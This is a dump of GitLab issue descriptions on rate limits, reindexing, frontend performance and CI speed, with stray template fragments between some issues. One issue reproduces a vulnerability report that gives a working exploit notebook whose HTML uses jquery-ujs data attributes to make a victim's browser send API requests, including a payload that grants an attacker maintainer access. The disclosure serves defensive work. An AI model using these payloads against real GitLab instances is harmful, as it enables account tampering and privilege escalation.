title: VSA: Use similarity search option for GraphQL projects queries
description:
### Problem to solve

Under https://gitlab.com/gitlab-org/gitlab/-/issues/233501 we introduced the "similarity search option" for projects to the GraphQL API.  This provides much better results when searching for projects by name.  However, this option is not yet being used on the ~frontend.

### Proposal

The ~frontend for VSA should switch to the GrapqhQL API for project queries and should use the similarity search option when searching projects by name.

### Related links

- This issue was prompted by this discussion: https://gitlab.com/gitlab-org/gitlab/-/issues/233501#note_408569173

title: NuGet package source API rate limits
description:
<!---
Please read this!

Before opening a new issue, make sure to search for keywords in the issues
filtered by the "regression" or "bug" label:

- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression
- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug

and verify the issue you're about to submit isn't a duplicate.
--->

### Summary

<!-- Summarize the bug encountered concisely. -->

We have published a few nuget packages in the package registry (gitlab.com). We also have two runners that take care of our pipeline (not using the shared runners of gitlab).

When restoring the nuget packages, nuget asks all sources for all required packages. So the gitlab registry will also be called for packages that are on nuget.org.

With the rate limits used on gitlab.com (see [docs](https://docs.gitlab.com/ce/user/gitlab_com/index.html#gitlabcom-specific-rate-limits) and [current settings](https://gitlab.com/gitlab-cookbooks/gitlab-haproxy/blob/master/attributes/default.rb)) our runners constantly get `429 Too many requests` as soon as a few .net jobs are running.

This basically renders the gitlab package repository completly useless for us. Nuget is a pretty request intensive package manager and the current rate limits of gitlab.com seem way too low.

### Steps to reproduce

<!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. -->
- Pipeline building a .NET project, preferrably something with a bunch of references like an AspNet Core API project
- Add a nuget package source using a package registry on gitlab.com
- Pipeline should run on an own runner (you probably won't get the error on shared runners)
- Start multiple (3-4?) build jobs (`dotnet restore` should be enough)

### What is the current *bug* behavior?

<!-- Describe what actually happens. -->
Constantly getting `429 Too many requests` for the NuGet package registry API

### What is the expected *correct* behavior?

<!-- Describe what you should see instead. -->
Higher rate limits for the NuGet package registry API, so that a normal usage doesn't constantly run against the rate limits.

### Relevant logs and/or screenshots

<!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code
 as it's tough to read otherwise. -->

```
Microsoft (R) Build Engine version 16.7.0-preview-20360-03+188921e2f for .NET
Copyright (C) Microsoft Corporation. All rights reserved.
  Determining projects to restore...
  Retrying 'FindPackagesByIdAsync' for source 'https://gitlab.com/api/v4/projects/<redacted>/packages/nuget/download/system.resources.resourcemanager/index.json'.
  Response status code does not indicate success: 429 (Too Many Requests).
  Retrying 'FindPackagesByIdAsync' for source 'https://gitlab.com/api/v4/projects/<redacted>/packages/nuget/download/system.reflection.extensions/index.json'.
  Response status code does not indicate success: 429 (Too Many Requests).
  Retrying 'FindPackagesByIdAsync' for source 'https://gitlab.com/api/v4/projects/<redacted>/packages/nuget/download/hangfire.sqlserver/index.json'.
  Response status code does not indicate success: 429 (Too Many Requests).
  Retrying 'FindPackagesByIdAsync' for source 'https://gitlab.com/api/v4/projects/<redacted>/packages/nuget/download/microsoft.extensions.localization.abstractions/index.json'.
  Response status code does not indicate success: 429 (Too Many Requests).
[...]
```

### Output of checks

<!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com -->
This bug happens on GitLab.com

### Possible fixes

<!-- If you can, link to the line of code that might be responsible for the problem. -->
Probably somewhere around here: https://gitlab.com/gitlab-cookbooks/gitlab-haproxy/blob/master/attributes/default.rb#L66

title: Automatically select index for reindexing
description:
With https://gitlab.com/gitlab-org/gitlab/-/issues/230829, we have a means to reindex a regular index. Picking the index is a manual operation.

In this issue, we add a heuristic to select a target index for reindexing. Ideally, we would target the most bloated indexes. We can estimate index bloat in the database, however we'll have to be careful not to make this estimate too expensive.

The outcome of this issue is that we have a rake task `db:reindex` which doesn't need any parameter, but selects the right index automatically.

title: Reindexing: Detect block situation and cancel process
description:
In https://gitlab.com/gitlab-org/gitlab/-/issues/230829, we create a rake task to perform reindexing.

Now while index creation is being run with `CONCURRENTLY`, this still holds some locks on the target table. This might be in conflict with other migrations which are attempted concurrently (like a deploy).

I'd like to explore the idea of checking the state of locks in parallel to running the reindexing. If we detect the reindexing process (the PG backend) blocks any other backend, we could signal it to cancel the process.

title: Issue List - Vue Issue List API fetch performance optimization
description:
## Background
Our Q3 OKR in product/dev includes a goal to improve the LCP for our issue list (&4279).

## Problem
The refactored issuable Vue component significantly increases the LCP because fetching the issue list data doesn't immediately begin as the page starts loading.

![image__1_](/uploads/03f477556aa8f477055a1352bec6fab4/image__1_.png)

### Comparison of LCPs (in sec) between the current HAML issue list and the Vue issue list

#### LCP benchmark against https://gitlab.com/postmarketOS/pmaports/-/issues

Tracked at https://dashboards.gitlab.net/d/000000044/sitespeed-page-timing-metrics?orgId=1&from=now-30d&to=now&var-base=sitespeed_io&var-path=desktop&var-group=gitlab_com&var-page=GitLab_Issue_list&var-browser=chrome&var-connectivity=cable&var-function=median

#### Local `sitespeed.io` runs  (as of Sep 7)
- The tests were done against https://gitlab.com/groups/tech-marketing/demos/gitlab-agile-demo/large-co/-/issues locally (`gdk measure`)

| | LCP (in sec) |
| ---      |  ------: |
| HAML issue list  | 1.270   |
| Vue issue list  | 2.636   |

## Possible Solutions
1. Use startup.js for issue list.
2. Embed serialized json data in HAML.

title: Sending Arbitrary Requests through Jupyter Notebooks on gitlab.com and Self-Hosted GitLab Instances
description:
**[HackerOne report #970869](https://hackerone.com/reports/970869)** by `iwis` on 2020-08-30, assigned to @rchan-gitlab:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

> *NOTE*: I am still researching whether there is a possibility to deploy the exploit without user interaction.

#####  Summary

GitLab provides a [rich representation](https://docs.gitlab.com/ee/user/project/repository/jupyter_notebooks/) for Jupyter Notebooks (`*.ipynb`). In turn, Jupyter Notebooks provide the possibility for [rich output via HTML](https://nbviewer.jupyter.org/github/ipython/ipython/blob/master/examples/IPython%20Kernel/Rich%20Output.ipynb#HTML). Although most tags and attributes are stripped from the HTML output rendered in GitLab's rich representation, it retains `data-*` attributes. Using [`jquery-ujs`](https://gitlab.com/gitlab-org/gitlab/-/blob/4e12f87c013f59070bf1156bb2427af9fa9123c4/package.json#L101) as a gadget, it is possible to trigger `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params). On https://gitlab.com, the CSP restricts the target, while there is no such limitation for self-hosted GitLab instances. As of now, this vulnerability requires user interaction in the form of a single click followed by and applies to https://gitlab.com as well as self-hosted GitLab instances.

#####  Steps to reproduce

1. Create a GitLab project or refer to an existing project.  
2. Upload an `exploit.ipynb` file with the following contents:

     ```json  
    {  
      "cells": [  
        {  
          "metadata": { "trusted": true },  
          "cell_type": "code",  
          "source": "Tell me something about you!",  
          "execution_count": 1,  
          "outputs": [  
            {  
              "output_type": "display_data",  
              "data": {  
                "text/plain": "<IPython.core.display.HTML object>",  
                "text/html": "What's your favorite color?&emsp;<select data-method=\"put\" data-params=\"message=p0wn3d\" data-remote=\"true\" data-url=\"/api/v4/user/status\"><option>Red</option><option>Green</option><option>Blue</option></select>\n"  
              },  
              "metadata": {}  
            }  
          ]  
        }  
      ],  
      "metadata": {  
        "kernelspec": {  
          "name": "python3",  
          "display_name": "Python 3",  
          "language": "python"  
        },  
        "language_info": {  
          "name": "python",  
          "version": "3.7.8",  
          "mimetype": "text/x-python",  
          "codemirror_mode": { "name": "ipython", "version": 3 },  
          "pygments_lexer": "ipython3",  
          "nbconvert_exporter": "python",  
          "file_extension": ".py"  
        }  
      },  
      "nbformat": 4,  
      "nbformat_minor": 4  
    }  
    ```  
where `cells[0].outputs[0].data.text/html` contains the payload.  
3. In the *Files*  view of the project, click on the above-added `exploit.ipynb`.  
4. Select an option other than the default.  
5. Reload the page to recongize that your status has been altered, i.e. click on your profile in the top right corner.

#####  Impact

An attacker is able to send `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params) to targets within the CSP on https://gitlab.com or arbitrary targets on self-hosted GitLab instances on behalf of the victim.

The impact is similar to that of #824689 and #806571.

#####  Examples

Due to the destructive nature of the above-described example, I do not provide a public PoC, although I have created [an exemplary repository](https://gitlab.com/dpfuerst/sending-arbitrary-requests-through-jupyter-notebooks). This repository is private, please let me know if you would like me to change the visibility.

The above-described `exploit.ipynb` [sets the user status](https://docs.gitlab.com/ee/api/users.html#set-user-status) of the victim to `p0wn3d`. However, more critical permission-related exploits are also possible. Consider an attacker with developer access to a project who wants to gain maintainer access, instead. That attacker could upload an exploit like the above with the following payload:

```html  
What's your favorite color?&emsp;<select data-method=\"put\" data-params=\"user_id=<ATTACKER_ID>&access_level=40\" data-remote=\"true\" data-url=\"/api/v4/projects/<PROJECT_ID>/members\"><option>Red</option><option>Green</option><option>Blue</option></select>\n  
```

where `<ATTACKER_ID>` is to be replaced with the attacker's user ID and `<PROJECT_ID>` is to be replaced with the target project's ID to [gain maintainer access](https://docs.gitlab.com/ee/api/members.html#edit-a-member-of-a-group-or-project).

#####  What is the current *bug* behavior?

The provided `exploit.ipynb` renders to

```html  
What's your favorite color? <select data-url="/api/v4/user/status" data-remote="true" data-params="message=p0wn3d" data-method="put"><option>Red</option><option>Green</option><option>Blue</option></select>  
```

#####  What is the expected *correct* behavior?

The provided `exploit.ipynb` should render to

```html  
What's your favorite color? <select><option>Red</option><option>Green</option><option>Blue</option></select>  
```

That is, `data-*` attributes should be stripped from GitLab's rich output. If the `data-*` attributes are necessary to provide another feature within the rich output, their appearance should be whitelisted, at least.

#####  Output of checks

This bug happens on GitLab.com

######  Results of GitLab environment info

```  
System information                                                         
System:         Ubuntu 16.04                                               
Proxy:          no                                                         
Current User:   git                                                        
Using RVM:      no                                                         
Ruby Version:   2.6.6p146                                                  
Gem Version:    2.7.10                                                     
Bundler Version:1.17.3                                                     
Rake Version:   12.3.3                                                     
Redis Version:  5.0.9                                                      
Git Version:    2.28.0                                                     
Sidekiq Version:5.2.9                                                      
Go Version:     unknown                                                    
                                                                           
GitLab information                                                         
Version:        13.3.2-ee                                                  
Revision:       d4deaad1474                                                
Directory:      /opt/gitlab/embedded/service/gitlab-rails                  
DB Adapter:     PostgreSQL                                                 
DB Version:     11.7                                                       
URL:            <REDACTED>  
HTTP Clone URL: <REDACTED>  
SSH Clone URL:  <REDACTED>  
Elasticsearch:  no                                                         
Geo:            no                                                         
Using LDAP:     no                                                         
Using Omniauth: yes                                                        
Omniauth Providers:                                                        
                                                                           
GitLab Shell                                                               
Version:        13.6.0                                                     
Repository storage paths:                                                  
- default:      /git/repositories                                          
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell  
Git:            /opt/gitlab/embedded/bin/git  
```

####  Impact

An attacker is able to send `GET`/`POST`/`PUT`/`DELETE` requests with an [arbitrary payload](https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-params) to targets within the CSP on https://gitlab.com or arbitrary targets on self-hosted GitLab instances on behalf of the victim. For example, using the GitLab API as a target, an attacker could gain maintainer access to a project, given that the victim is maintainer (or higher) themselves.

The impact is similar to that of #824689 and #806571.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [exploit.ipynb](https://h1.sec.gitlab.net/a/3647e251-cc3d-4abd-89d5-8fd562fd87d7/exploit.ipynb)

## How To Reproduce

Please add [reproducibility information] to this section:

title: Files starting with a space are indistinguishable from same name without space in Web-IDE
description:
### Summary

In the Web-IDE's filetree-view: If a directory name starts with a space (' ') it's indistinguishable from same name without space.

### Steps to reproduce

1. create a repo
2. create a file called ' .test/Readme' directly in the repo-view and commit
3. reopen repo in web-ide
4. create a directory called 'test' and commit


### Example Project

https://gitlab.com/admindojo/testestest

### What is the current *bug* behavior?

Both directories are indistinguishable from another. 

### What is the expected *correct* behavior?

The space at the beginning should be at least somehow visible. It's also hard to see a difference in my local IDE(Pycharm), but it a difference is visible.

I only stumbled across this, because the repo-view allowed me to create a directory starting with a space. I'll report this as a separate issue. (the web-ide already prevents this)

title: Internal projects should default to GitLab Pages Everyone with Access visibility (currently: Only Project Members)
description:
<!---
Please read this!

Before opening a new issue, make sure to search for keywords in the issues
filtered by the "regression" or "bug" label:

- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression
- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug

and verify the issue you're about to submit isn't a duplicate.
--->

### Summary

As first mentioned at https://gitlab.com/gitlab-org/gitlab/-/issues/230584#note_405101626 Internal projects are defaulting GitLab Pages access controls to Only Project Members. This does not line up with Internal project access controls and should instead be Everyone with Access by default.
<!-- Summarize the bug encountered concisely. -->

### Steps to reproduce

1. Create Internal project
1. Look at project setting for pages

<!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. -->

### Example Project

*.com does not support Internal projects, example not possible on .com*

### What is the current *bug* behavior?

This is default but doesn't align with Internal access controls

see also https://gitlab.com/gitlab-org/gitlab/-/issues/230584#note_406477468

![image](/uploads/d6c4c2a3c905ce717eecbad3e48e23a3/image.png)

<!-- Describe what actually happens. -->

### What is the expected *correct* behavior?

This is default which aligns with Internal access controls

see also https://gitlab.com/gitlab-org/gitlab/-/issues/230584#note_406477468

![image](/uploads/60573d45c279416fe231f1ba7778b824/image.png)

<!-- Describe what you should see instead. -->

### Possible fixes

* [ ] Fix bug
* [ ] In blog post about bug fix give admins command they can run to optional reset all Internal projects Pages Access Controls to Everyone With Access
* [ ] In details about enabling Pages Access Controls give admins command to reset all Internal projects Pages Access Controls to Everyone With Access

<!-- If you can, link to the line of code that might be responsible for the problem. -->

title: API Fuzzing CI/CD pipeline speed improvements
description:
The API Fuzzing CI/CD pipeline takes 30 minutes to complete and publish a build to staging. Much of this time is spent running integration tests. Our goal is to achieve a 15 minute build.

Current time breakdown:

| Stage   | Runtime (min) | 2020/9/17 |
|:--------|:--------------|:----------|
| build   | 7             | 8         |
| tests   | 18            | 9         |
| publish | 5             | 5         |
|         |               |           |
| *TOTALS*| *30*          | *22*      |

Build stage improvements:

 - Already has a number of optimizations

Identified areas slowing testing stage:

- [x] Review use of global cache
- [x] Disable git clone on test jobs
  - [x] Copy test scripts to output folder during `build`
  - [x] Script locations in `.gitlab-ci.yml`
- Scanner integration tests `test_int_peach`: 12 minutes
  - [x] Use `dotnet` cli to list all integration tests, divide by total, build command line with specific test names
    - Use parallel
    - Mike: Time went from 12 to 7 minutes
- Integration tests that perform a scan
  - [ ] Trim down HAR file to only do a single operation for python modules and `worker-entry`
    - [x] `worker-entry` integration tests take a while due to this
      - Mike: Time went from 14 minutes to 9 minutes
    - [ ] `runner`
  - [x] Parallelized `worker-entry` tests. Currently at 9 minutes.
    - Mike: Time went from 9 minutes to 7 minutes.
  - [x] Parallelized `runner` tests. Currently at 17 minutes.
    - Mike: Time went from 17 minutes to 9 minutes with 3 jobs.
  - Keep har + openapi integration runs with full files
- [x] Can we build SDK separate from scanner?
  - Is docker image build impacted?

Publish:

- Disable git clone on publish jobs
  - Move publish scripts to output folder during `build` job

/cc @sethgitlab @stkerr

title: Geo: Add rake task to check DB replication
description:
Add a rake task which exits 0 if Geo DB replication is working, and exits 1 if not.

This task can then be used programmatically to determine whether to run `replicate-geo-database` on a secondary.

See https://gitlab.com/gitlab-org/gitlab-orchestrator/-/issues/200

title: Use BulkInsertSafe instead of create when inserting rows to CIPlatformMetrics
description:
Follow up from https://gitlab.com/gitlab-org/gitlab/-/merge_requests/40036#note_407624858

@ayufan wrote:

> The `create`. This inserts objects one-by-one. It means that this method executes `10 SQL queries` to insert each object individually.
>
> We do have `BulkInsertSafe` model to enable a bulk insert functionality that allows us to insert that in a single SQL query :)

This should be addressed immediately. I am adding this ticket to the scope of the current milestone.

New pages deployments can break

If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example.

## Roll Out Steps

title: Block features based on issue type
description:
Follow up of: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41575

https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41575 blocks `/promote` quick action for `incident` issue type by checking if epics are supported. Maybe we need something more generic and reusable to check whether or not a feature is available for a issue type. This is something that also needs to be done for `test_case` issue type.

The proposal is to have a list of blocked features by type somewhere in the code, like:

``` ruby
Class Issue
  def supports_feature?(feature:)
     blocked_actions_by_type(self.type).include?(action.to_sym)
  end

  def blocked_features_by_type
     {
        'incident': %i(promote),
        'test_case': %i(confidential promote todo),
        ...
        ...
     }
  end
end
```    

We could also use this to hide not allowed components for an issue type on UI and other checks.

For more information check: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41575#note_407553038

Currently piloting, details can be found in this issue: https://gitlab.com/gitlab-com/Product/-/issues/1392 and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg The next four sections: "Problem to solve", "Intended users", "User experience goal", and "Proposal", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. ### Release notes 

<!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). " -->

### Problem to solve

To ensure a consistent experience, the different UI's under the Package Stage umbrella should be consistent when referencing users to documentation. Following Pajamas guidelines, this means all references to the documentation should be "Details of this UI. [More information](docs)".

Original issue: https://gitlab.com/gitlab-org/gitlab/-/issues/245264

### Intended users


* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)
* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)
* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)
* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)
* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)
* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager) 

### User experience goal

Enable users to quickly and consistently find documentation links throughout the Package Stage UI.


### Proposal

First, we need to manually investigate the user interface in the Container Registry, Dependency Proxy, project settings, group settings, admin settings, and empty/error states to ensure all references to the documentation follow the correct pattern. 

Second, after cataloging the instances where we currently display an inconsistent reference to documentation, update the body copy and link to be the above pattern.

title: Cleanup merge request refs of old closed/merged merge requests
description:
In https://gitlab.com/gitlab-org/gitlab/-/issues/223156, we worked on implementing a functionality to clean up merge request refs after 14 days an MR gets closed/merged.

As of this writing, it won't work for merge requests that were closed/merged prior to the change.

This issue is for adding a migration (likely a background migration) to apply the same thing for old merge requests (MRs that were closed/merged 14 or more days ago).

There's a worker and service that were added in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/41555 that can be re-used if ever.
